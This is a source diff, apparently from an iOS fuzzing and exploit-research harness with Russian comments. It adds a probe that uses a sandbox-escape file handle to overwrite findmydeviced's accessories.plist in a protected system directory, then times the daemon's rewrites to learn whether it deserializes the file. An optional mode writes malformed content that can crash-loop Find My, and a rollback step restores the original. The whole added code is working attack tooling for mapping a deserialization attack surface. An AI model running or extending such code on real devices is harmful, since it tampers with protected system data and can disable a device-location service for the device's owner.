@@ -30441,6 +30441,346 @@ static void p_ftp2(void) {
 }
 
 // ---------------------------------------------------------------------------
+// V186 (p_fmy1): "вход или выход?" — детектор ЧТЕНИЯ findmydeviced,
+// построенный по входу (PID-оракул мёртв §190: KERN_PROC_ALL EPERM).
+//
+// §180 не смог различить две гипотезы об accessories.plist (обе дают
+// DAEMON-REPAIRED):
+//   H_read  — демон ПЕРИОДИЧЕСКИ ЧИТАЕТ файл (NSKeyedUnarchiver decode)
+//             и перезаписывает своей моделью;
+//   H_write — файл только ВЫХОД: демон сериализует модель, читает никогда.
+// Различающий эксперимент, три фазы + обязательный авто-откат (§144):
+//
+//   1. CONTROL: суффикс "fz186" в name-слоте (метод §180, доказанно
+//      ремонтируется). Ждём REPAIR до 660s: цикл перезаписи ЖИВ прямо
+//      сейчас, детектор положителен, фиксируем T1. Нет REPAIR →
+//      цикл молчит в окне, лечение неинтерпретируемо → откат, честный
+//      выход (никаких «негативов» на мёртвом цикле — §144).
+//   2. TREATMENT (опция FUZZ_FMY1_TREAT=1): файл заменяется на ВАЛИДНЫЙ
+//      plist, НЕ являющийся NSKeyedArchiver-графом (plain dict с ключом
+//      "fz186t"). CFPropertyList парсится, unarchive — падает. Исходы:
+//        (a) файл снова архивом → демон перезаписывает поверх не-архивов:
+//            чтение НЕ доказано (совместимо с обеими гипотезами);
+//        (b) наш dict стоит, а connectedAccessories.plist (ВТОРОЙ файл
+//            демона — алиф-сигнал, bq6 видел mtime-двиги обоих разом
+//            +320/+619с) продолжает двигаться → демон ЖИВ, а write-back
+//            accessories ПРЕКРАТИЛСЯ из-за нашего контента = READ PROVEN
+//            (H_write требовал бы перезаписи в любом случае);
+//        (c) оба файла замерли дольше freezeT (2*T1) → демон упал на
+//            нашем контенте (краш-луп) = READ PROVEN + краш-детектор
+//            доказан; немедленный откат.
+//   3. ROLLBACK: восстановление ТОЛЬКО при наличии нашего маркера (если
+//      демон уже переписал файл своей более свежей моделью — не затираем
+//      её честным бэкапом §180 учёл гонку), побайтовая сверка.
+//
+// Риск (лечение): decode-исключение в демоне → краш-луп Find My до отката
+// (данные не теряются — бэкап верифицирован; список аксессуаров
+// недоступен ≤ freezeT). Поэтому лечение отдельной опцией, не дефолтом.
+// ---------------------------------------------------------------------------
+
+static double fmy1_ms(void) {
+    struct timeval tv;
+    gettimeofday(&tv, NULL);
+    return tv.tv_sec * 1000.0 + tv.tv_usec / 1000.0;
+}
+
+// Рекурсивный поиск маркера через ПАРСЕР plist: файл BINARY, попытка
+// NSString-from-UTF8 молча вернула бы nil и маркер читался бы всегда 0 —
+// ровно тот ложный негатив, что описывает §144 (урок bq9-детектора).
+static BOOL fmy1_has_marker(id obj, NSString *needle, int depth) {
+    if (depth > 6 || !obj) return NO;
+    if ([obj isKindOfClass:[NSDictionary class]]) {
+        for (id k in obj) {
+            if ([k isKindOfClass:[NSString class]] &&
+                [k rangeOfString:needle].location != NSNotFound) return YES;
+            if (fmy1_has_marker(obj[k], needle, depth + 1)) return YES;
+        }
+    } else if ([obj isKindOfClass:[NSArray class]]) {
+        for (id v in obj) if (fmy1_has_marker(v, needle, depth + 1)) return YES;
+    } else if ([obj isKindOfClass:[NSString class]]) {
+        return [obj rangeOfString:needle].location != NSNotFound;
+    }
+    return NO;
+}
+static BOOL fmy1_marker_in_data(NSData *d, const char *needle) {
+    if (d.length == 0) return NO;
+    CFPropertyListRef pl = CFPropertyListCreateWithData(kCFAllocatorDefault,
+        (__bridge CFDataRef)d, 0, NULL, NULL);
+    if (!pl) return NO;
+    BOOL m = fmy1_has_marker((__bridge id)pl,
+                             [NSString stringWithUTF8String:needle], 0);
+    CFRelease(pl);
+    return m;
+}
+// Является ли файл NSKeyedArchiver-графом (корень-dict с $objects).
+static BOOL fmy1_is_archive(NSData *d) {
+    if (d.length == 0) return NO;
+    CFPropertyListRef pl = CFPropertyListCreateWithData(kCFAllocatorDefault,
+        (__bridge CFDataRef)d, 0, NULL, NULL);
+    if (!pl) return NO;
+    id root = (__bridge id)pl;
+    BOOL a = [root isKindOfClass:[NSDictionary class]] &&
+             [root[@"$objects"] isKindOfClass:[NSArray class]];
+    CFRelease(pl);
+    return a;
+}
+
+// Запись + readback-сверка. O_TRUNC как в bq9 — escape-хэндл §170 уже открыт.
+static BOOL fmy1_write(NSString *path, NSData *d, const char *tag) {
+    int fd = open(path.fileSystemRepresentation, O_WRONLY | O_TRUNC);
+    if (fd < 0) {
+        LOG("[fmy1] %s W-open errno %d", tag, errno);
+        return NO;
+    }
+    ssize_t w = write(fd, d.bytes, d.length);
+    fsync(fd); close(fd);
+    NSData *back = [NSData dataWithContentsOfFile:path options:0 error:nil];
+    BOOL ok = (w == (ssize_t)d.length) && [back isEqualToData:d];
+    LOG("[fmy1] %s w=%zd/%zu readback-identical=%d", tag, w, (size_t)d.length,
+        [back isEqualToData:d] ? 1 : 0);
+    return ok;
+}
+
+// CONTROL-пейлоад: копия bq9-MODIFY — суффикс в name-слоте первого
+// аксессуара, типы и UID графа не тронуты (reparse остаётся валидным).
+static NSData *fmy1_control_payload(NSData *cur, NSString **slotInfo) {
+    CFPropertyListRef plist = CFPropertyListCreateWithData(kCFAllocatorDefault,
+        (__bridge CFDataRef)cur, kCFPropertyListMutableContainersAndLeaves,
+        NULL, NULL);
+    if (!plist) return nil;
+    NSMutableDictionary *root =
+        [(__bridge id)plist isKindOfClass:[NSMutableDictionary class]]
+            ? (__bridge NSMutableDictionary *)plist
+            : [(__bridge id)plist mutableCopy];
+    CFRelease(plist);
+    NSMutableArray *objs = [root[@"$objects"] isKindOfClass:[NSArray class]]
+        ? [root[@"$objects"] mutableCopy] : nil;
+    if (!objs) return nil;
+    NSUInteger slotIdx = NSNotFound;
+    for (NSUInteger i = 0; i < objs.count && slotIdx == NSNotFound; i++) {
+        id o = objs[i];
+        if (![o isKindOfClass:[NSDictionary class]]) continue;
+        id nv = o[@"name"];
+        if (!nv || bq9_uid_index(nv) == NSNotFound) continue;
+        if (!o[@"accessoryType"] && !o[@"accessoryIdentifier"]) continue;
+        NSUInteger si = bq9_uid_index(nv);
+        if (si >= objs.count || ![objs[si] isKindOfClass:[NSString class]])
+            continue;
+        slotIdx = si;
+    }
+    if (slotIdx == NSNotFound) return nil;
+    NSString *oldVal = objs[slotIdx];
+    objs[slotIdx] = [oldVal stringByAppendingString:@" fz186"];
+    root[@"$objects"] = objs;
+    if (slotInfo)
+        *slotInfo = [NSString stringWithFormat:@"objects[%zu]: \"%s\" -> \"%s\"",
+                     slotIdx, oldVal.UTF8String,
+                     ((NSString *)objs[slotIdx]).UTF8String];
+    CFDataRef cmod = CFPropertyListCreateData(kCFAllocatorDefault,
+        (__bridge CFPropertyListRef)root, kCFPropertyListBinaryFormat_v1_0,
+        0, NULL);
+    return (__bridge_transfer NSData *)cmod;
+}
+
+static void p_fmy1(void) {
+    const int do_treat = getenv("FUZZ_FMY1_TREAT") != NULL;
+    LOG("[fmy1] v186 read-vs-write detector for findmydeviced: "
+        "control%s -> watch -> rollback", do_treat ? "+treatment" : "");
+
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[fmy1] CONTROL §170 point -> handle %lld%s", (long long)h,
+        h < 0 ? "  *** NO ESCAPE — aborting ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) { LOG("[fmy1] done"); return; }
+
+    NSString *acc = bq9_target();
+    NSString *conn = [acc.stringByDeletingLastPathComponent
+        stringByAppendingPathComponent:
+            @"com.apple.icloud.findmydeviced.connectedAccessories.plist"];
+    NSData *cur = [NSData dataWithContentsOfFile:acc options:0 error:nil];
+    LOG("[fmy1] target: %s (%zu bytes)", acc.UTF8String, (size_t)cur.length);
+    if (cur.length == 0) {
+        LOG("[fmy1] target unreadable (errno %d) — abort, system untouched",
+            errno);
+        bad_query_release(h); LOG("[fmy1] done"); return;
+    }
+    if (!fmy1_is_archive(cur)) {
+        LOG("[fmy1] target is NOT an archive already — precondition failed, "
+            "abort, system untouched");
+        bad_query_release(h); LOG("[fmy1] done"); return;
+    }
+
+    struct stat cst = {0}, kst = {0};
+    stat(acc.fileSystemRepresentation, &cst);
+    stat(conn.fileSystemRepresentation, &kst);
+    time_t connMt0 = kst.st_mtime;
+    LOG("[fmy1] acc mtime %lld size %lld | conn mtime %lld size %lld",
+        (long long)cst.st_mtime, (long long)cst.st_size,
+        (long long)kst.st_mtime, (long long)kst.st_size);
+    fsync(fileno(stderr));
+
+    // ---- CONTROL: суффикс в name-слоте -> ждём ремонта (цикл ЖИВ).
+    NSString *slotInfo = nil;
+    NSData *ctrl = fmy1_control_payload(cur, &slotInfo);
+    if (!ctrl || !fmy1_write(acc, ctrl, "CONTROL write")) {
+        LOG("[fmy1] control payload failed — abort, system untouched");
+        bad_query_release(h); LOG("[fmy1] done"); return;
+    }
+    LOG("[fmy1] CONTROL: %s", slotInfo.UTF8String);
+
+    const double POLL_MS = 15000.0, CTRL_MAX_MS = 660000.0;
+    double t0 = fmy1_ms(), T1 = 0, lastBeat = 0;
+    BOOL controlRepaired = NO;
+    while (fmy1_ms() - t0 < CTRL_MAX_MS) {
+        usleep(15000000);
+        NSData *d = [NSData dataWithContentsOfFile:acc options:0 error:nil];
+        BOOL present = fmy1_marker_in_data(d, "fz186");
+        double el = fmy1_ms() - t0;
+        if (!present) {
+            T1 = el;
+            controlRepaired = YES;
+            LOG("[fmy1] CONTROL-REPAIRED at %.0fs (archive=%d, %zu bytes) — "
+                "rewrite cycle ALIVE, detector positive", el / 1000.0,
+                fmy1_is_archive(d) ? 1 : 0, (size_t)d.length);
+            break;
+        }
+        if (el - lastBeat >= 60000.0) {
+            lastBeat = el;
+            stat(conn.fileSystemRepresentation, &kst);
+            LOG("[fmy1]   control watch %.0fs: marker=1, conn mtime %lld "
+                "(+%lld)", el / 1000.0, (long long)kst.st_mtime,
+                (long long)(kst.st_mtime - connMt0));
+            fsync(fileno(stderr));
+        }
+    }
+    if (!controlRepaired) {
+        LOG("[fmy1] CONTROL-TIMEOUT after %.0fs — rewrite cycle silent in "
+            "this window; treatment would be uninterpretable -> ROLLBACK, "
+            "honest exit (no negative without a live detector, §144)",
+            CTRL_MAX_MS / 1000.0);
+        fmy1_write(acc, cur, "ROLLBACK(control-timeout)");
+        bad_query_release(h); LOG("[fmy1] done"); return;
+    }
+    fsync(fileno(stderr));
+
+    const char *verdict = "TREATMENT-SKIPPED (control-only run)";
+    if (do_treat) {
+        // ---- TREATMENT: валидный plist, но НЕ архив.
+        NSDictionary *plain = @{@"fz186t": @"non-archive-v186"};
+        NSData *pd = [NSPropertyListSerialization
+            dataFromPropertyList:plain format:NSPropertyListBinaryFormat_v1_0
+            errorDescription:NULL];
+        if (!pd || fmy1_is_archive(pd) ||
+            !fmy1_write(acc, pd, "TREATMENT write")) {
+            LOG("[fmy1] treatment payload failed — ROLLBACK");
+            fmy1_write(acc, cur, "ROLLBACK(treatment-write-failed)");
+            bad_query_release(h); LOG("[fmy1] done"); return;
+        }
+
+        struct stat cm0 = {0};
+        stat(conn.fileSystemRepresentation, &cm0);
+        double s0 = fmy1_ms();
+        double freezeT = T1 * 2.0;
+        if (freezeT < 240000.0) freezeT = 240000.0;
+        if (freezeT > 600000.0) freezeT = 600000.0;
+        double treatMax = 660000.0;
+        LOG("[fmy1] treatment watch: freezeT=%.0fs window=%.0fs, conn mtime0 "
+            "%lld", freezeT / 1000.0, treatMax / 1000.0,
+            (long long)cm0.st_mtime);
+
+        BOOL repaired = NO, present = YES, connMoved = NO, frozen = NO;
+        lastBeat = 0;
+        double T2 = 0;
+        while (fmy1_ms() - s0 < treatMax) {
+            usleep(15000000);
+            NSData *d = [NSData dataWithContentsOfFile:acc options:0 error:nil];
+            present = fmy1_marker_in_data(d, "fz186t");
+            BOOL arch = fmy1_is_archive(d);
+            struct stat cm = {0};
+            stat(conn.fileSystemRepresentation, &cm);
+            BOOL moved = cm.st_mtime > cm0.st_mtime;
+            double el = fmy1_ms() - s0;
+            if (arch && !present) {
+                T2 = el; repaired = YES;
+                LOG("[fmy1] TREAT-REPAIRED at %.0fs — daemon overwrote a "
+                    "non-archive: write-back not conditioned on decode "
+                    "(read UNPROVEN, compatible with H_read+ignore and H_write)",
+                    el / 1000.0);
+                break;
+            }
+            if (!d.length)
+                LOG("[fmy1]   target UNREADABLE/GONE at %.0fs (errno %d)",
+                    el / 1000.0, errno);
+            if (moved && !connMoved) {
+                connMoved = YES;
+                LOG("[fmy1]   connAccessories MOVED (mtime %lld -> %lld) at "
+                    "%.0fs — daemon ALIVE during treatment",
+                    (long long)cm0.st_mtime, (long long)cm.st_mtime,
+                    el / 1000.0);
+                fsync(fileno(stderr));
+            }
+            if (present && !moved && el > freezeT) {
+                frozen = YES;
+                T2 = el;
+                LOG("[fmy1] FREEZE at %.0fs: our content stands, "
+                    "connAccessories silent >%.0fs (2*T1) — daemon died on "
+                    "our content = READ PROVEN + crash detector LIVE",
+                    el / 1000.0, freezeT / 1000.0);
+                break;
+            }
+            if (el - lastBeat >= 60000.0) {
+                lastBeat = el;
+                LOG("[fmy1]   treat watch %.0fs: present=%d archive=%d "
+                    "conn_moved=%d", el / 1000.0, present ? 1 : 0,
+                    arch ? 1 : 0, moved ? 1 : 0);
+                fsync(fileno(stderr));
+            }
+        }
+        if (repaired) {
+            verdict = "(a) TREAT-REPAIRED — read NOT proven";
+        } else if (present && connMoved) {
+            verdict = "(b) READ PROVEN — content stands while daemon alive "
+                      "(write-back stopped on our content)";
+        } else if (present && frozen) {
+            verdict = "(c) READ PROVEN — daemon froze on our content "
+                      "(crash detector proven)";
+        } else if (present) {
+            verdict = "INCONCLUSIVE — our content stands but NO cycle fired "
+                      "in the window (control fired earlier; event-driven "
+                      "cadence possibly stopped)";
+        } else {
+            verdict = "UNCLASSIFIED — see log";
+        }
+    }
+
+    // ---- ROLLBACK: только если наш маркер ещё в файле (гонка §180:
+    // демон мог уже переписать более свежей моделью — её не затираем).
+    NSData *now = [NSData dataWithContentsOfFile:acc options:0 error:nil];
+    BOOL ours = fmy1_marker_in_data(now, "fz186") ||
+                fmy1_marker_in_data(now, "fz186t");
+    if (ours || !fmy1_is_archive(now)) {
+        fmy1_write(acc, cur, "ROLLBACK");
+        now = [NSData dataWithContentsOfFile:acc options:0 error:nil];
+        LOG("[fmy1] ROLLBACK byte-identical=%d marker:fz186=%d fz186t=%d",
+            [now isEqualToData:cur] ? 1 : 0,
+            fmy1_marker_in_data(now, "fz186") ? 1 : 0,
+            fmy1_marker_in_data(now, "fz186t") ? 1 : 0);
+    } else {
+        LOG("[fmy1] ROLLBACK skipped — no marker, archive intact: daemon "
+            "already re-serialized from its own model (state preserved, "
+            "our content gone)");
+    }
+
+    LOG("[fmy1] === VERDICT ===");
+    LOG("[fmy1] control: REPAIRED at %.0fs (cycle alive)", T1 / 1000.0);
+    LOG("[fmy1] read-status: %s", verdict);
+    LOG("[fmy1] done");
+    bad_query_release(h);
+}
+
+// ---------------------------------------------------------------------------
 // V177 (p_bq22): find the READERS. Rootfs is a dead end — the IPSW's
 // system dmgs are AEA-encrypted (094-13007-107.dmg.aea, 9.1 GB; keys
 // exist only at restore time on-device), so the §182 blind spot can
@@ -39356,6 +39696,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_PPRP3")) { p_pprp3(); LOG("[probe13] pprp3-only mode, stop"); return NULL; }
         if (getenv("FUZZ_FTP1")) { p_ftp1(); LOG("[probe13] ftp1-only mode, stop"); return NULL; }
         if (getenv("FUZZ_FTP2")) { p_ftp2(); LOG("[probe13] ftp2-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_FMY1")) { p_fmy1(); LOG("[probe13] fmy1-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ2")) { p_bq2(); LOG("[probe13] bq2-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ3")) { p_bq3(); LOG("[probe13] bq3-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ4")) { p_bq4(); LOG("[probe13] bq4-only mode, stop"); return NULL; }
